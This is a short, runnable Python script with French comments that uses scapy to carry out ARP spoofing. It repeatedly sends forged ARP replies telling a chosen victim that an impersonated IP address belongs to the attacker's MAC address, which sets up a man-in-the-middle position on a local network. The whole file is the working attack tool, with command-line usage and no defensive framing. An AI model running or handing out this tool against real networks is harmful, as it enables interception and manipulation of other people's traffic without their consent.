#!/usr/bin/env python3

from scapy.all import *
import sys

def arp_spoof(victim_ip, spoof_ip):
    try:
        attacker_mac = get_if_hwaddr(conf.iface)
        
        arp_response = ARP(
            op=2,  # Réponse ARP
            pdst=victim_ip,  # IP de la victime
            hwdst="ff:ff:ff:ff:ff:ff",  # Diffusion pour s'assurer que la victime reçoit le paquet
            psrc=spoof_ip,  # Adresse IP que nous usurpons
            hwsrc=attacker_mac  # MAC de l'attaquant
        )
        
        print(f"[+] ARP spoofing : {victim_ip} pense que {spoof_ip} = {attacker_mac}")
        
        while True:
            send(arp_response, verbose=False)
            time.sleep(2)  # Intervalle entre les paquets
    except KeyboardInterrupt:
        print("\n[!] Arrêt de l'attaque.")
        sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <victim_ip> <spoof_ip>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    spoof_ip = sys.argv[2]

    arp_spoof(victim_ip, spoof_ip)

